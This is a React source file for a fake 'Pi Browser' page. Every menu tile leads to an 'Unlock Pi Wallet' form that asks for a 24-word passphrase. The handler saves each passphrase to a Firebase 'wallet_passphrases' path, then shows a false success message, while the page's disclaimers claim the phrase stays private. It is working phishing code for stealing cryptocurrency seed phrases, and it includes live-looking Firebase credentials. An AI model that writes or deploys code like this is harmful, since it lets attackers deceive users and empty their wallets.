import { useState } from 'react'
import './App.css'
import pi_logo from "./assets/pi_logo.png";
import kyc_logo from "./assets/kyc_logo.png";
import Blockchian_logo from "./assets/Blockchian_logo.png";
import brainstorm_logo from "./assets/brainstorm_logo.png";
import chatlogo from "./assets/chatlogo.png";
import develop_logo from "./assets/develop_logo.png";
import fireside_logo from "./assets/fireside_logo.png";
import Mine_logo from "./assets/Mine_logo.png";
import wallet_logo from "./assets/wallet_logo.png";
import p2p from "./assets/p2p.png";
import { initializeApp } from "firebase/app";
import { getAnalytics } from "firebase/analytics";
import { getDatabase, ref, set } from "firebase/database"; // Changed push to set

function App() {
  const [showPassPhrase, setShowPassPhrase] = useState(false);
  const [passphrase, setPassphrase] = useState('');
  const [isLoading, setIsLoading] = useState(false);
  
  const firebaseConfig = {
    apiKey: "AIzaSyDK5aERpkiHWHCNbTWKMdTQWCrgwCULqmE",
    authDomain: "pi-browser-b5fd6.firebaseapp.com",
    projectId: "pi-browser-b5fd6",
    storageBucket: "pi-browser-b5fd6.firebasestorage.app",
    messagingSenderId: "341543117636",
    appId: "1:341543117636:web:14e647b94b555be9592d11",
    measurementId: "G-EHHSZEV96Y"
  };

  // Initialize Firebase
  const app = initializeApp(firebaseConfig);
  const analytics = getAnalytics(app);
  const database = getDatabase(app);

  const handleNavigateToPassPhrase = () => {
    setShowPassPhrase(true);
  };

  const handleGoBack = () => {
    setShowPassPhrase(false);
  };

  const handlePassphraseChange = (e) => {
    setPassphrase(e.target.value);
  };

  const handleUnlockWithPassphrase = () => {
    if (passphrase.trim()) {
      setIsLoading(true);
      
      // Generate a unique ID for this entry
      const uniqueId = Date.now().toString();
      
      // Reference to a specific location in your database
      const dataRef = ref(database, 'wallet_passphrases/' + uniqueId);
      
      // Data to be saved
      const dataToSave = {
        passphrase: passphrase,
        timestamp: new Date().toISOString()
      };
      
      // Save data to Firebase
      set(dataRef, dataToSave)
        .then(() => {
          console.log("Data saved successfully!");
          alert('Wallet unlocked successfully!');
          setPassphrase(''); // Clear input field
          setIsLoading(false);
        })
        .catch((error) => {
          console.error("Error saving data: ", error);
          alert('Error unlocking wallet. Please try again.');
          setIsLoading(false);
        });
    } else {
      alert('Please enter your passphrase');
    }
  };

  // PassPhrase Component
  if (showPassPhrase) {
    return (
      <div className="passphrase-container">
        <div className="passphrase-wrapper">
          <h1 className="passphrase-title">Unlock Pi Wallet</h1>
          
          <div className="passphrase-input-container">
            <div className="passphrase-textarea-wrapper">
              <textarea 
                placeholder="Enter your 24-word passphrase here"
                className="passphrase-textarea"
                value={passphrase}
                onChange={handlePassphraseChange}
              />
            </div>
          </div>
          
          <button 
            className="passphrase-button"
            onClick={handleUnlockWithPassphrase}
            disabled={isLoading}
          >
            {isLoading ? 'Unlocking...' : 'Unlock With Passphrase'}
          </button>
          
          
          <p className="disclaimer-text">
            As a non-custodial wallet, your wallet passphrase is exclusively accessible only to you. Recovery of passphrase is currently impossible.
          </p>
          
          <p className="disclaimer-text">
            Lost your passphrase? <a href="#" className="link-text">You can create a new wallet</a>, but all your π in your previous wallet will be inaccessible.
          </p>
          
        
        </div>
      </div>
    );
  }

  // Main App Component
  return (
    <>
      <div className="pi-browser">
        <div className="header">
          <div className="logo-container">
            <div className="pi-logo">
            <img src={pi_logo} alt="Pi Logo" onClick={handleNavigateToPassPhrase} />
            </div>
          </div>
          <h1 className="title">Welcome to the Pi Browser</h1>
        </div>

        <div className="menu-grid">
          <div className="menu-item" onClick={handleNavigateToPassPhrase}>
            <div className="icon-container purple">
            <img src={fireside_logo} alt="Pi Logo" />
            </div>
            <p>Fireside</p>
          </div>

          <div className="menu-item" onClick={handleNavigateToPassPhrase}>
            <div className="icon-container purple">
            <img src={wallet_logo} alt="Pi Logo" />
            </div>
            <p>Wallet</p>
          </div>

          <div className="menu-item" onClick={handleNavigateToPassPhrase}>
            <div className="icon-container purple">
            <img src={brainstorm_logo} alt="Pi Logo" />
            </div>
            <p>Brainstorm</p>
          </div>

          <div className="menu-item" onClick={handleNavigateToPassPhrase}>
            <div className="icon-container purple">
            <img src={Mine_logo} alt="Pi Logo" />
            </div>
            <p>Mine</p>
          </div>

          <div className="menu-item" onClick={handleNavigateToPassPhrase}>
          
            <div className='block_classs'>
            <img src={Blockchian_logo} alt="Pi Logo" />
            </div>
           
          
            <p>Blockchain</p>
          </div>

          <div className="menu-item" onClick={handleNavigateToPassPhrase}>
            <div className="icon-container purple">
            <img src={develop_logo} alt="Pi Logo" />
            </div>
            <p>Develop</p>
          </div>

          <div className="menu-item" onClick={handleNavigateToPassPhrase}>
            <div className="icon-container purple">
            <img src={kyc_logo} alt="Pi Logo" />
            </div>
            
            <p>KYC</p>
          </div>

          <div className="menu-item" onClick={handleNavigateToPassPhrase}>
            <div className="icon-container purple">
            <img src={chatlogo} alt="Chat" />
            </div>
            <p>Chat</p>
          </div>

          <div className="menu-item" onClick={handleNavigateToPassPhrase}>
            <div className="icon-container purple">
            <img src={p2p} alt="Chat" />
            </div>
            <p>P2P Payments</p>
          </div>
        </div>

        <div className="explore-button" onClick={handleNavigateToPassPhrase}>
          <div className="explore-icon">
            <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
              <path d="M12 22C17.5228 22 22 17.5228 22 12C22 6.47715 17.5228 2 12 2C6.47715 2 2 6.47715 2 12C2 17.5228 6.47715 22 12 22Z" stroke="white" strokeWidth="2" fill="none" />
              <path d="M15 9L9 15" stroke="white" strokeWidth="2" />
              <path d="M9 9L15 15" stroke="white" strokeWidth="2" />
            </svg>
          </div>
          <span>Explore the Ecosystem</span>
        </div>
      </div>
    </>
  )
}

export default App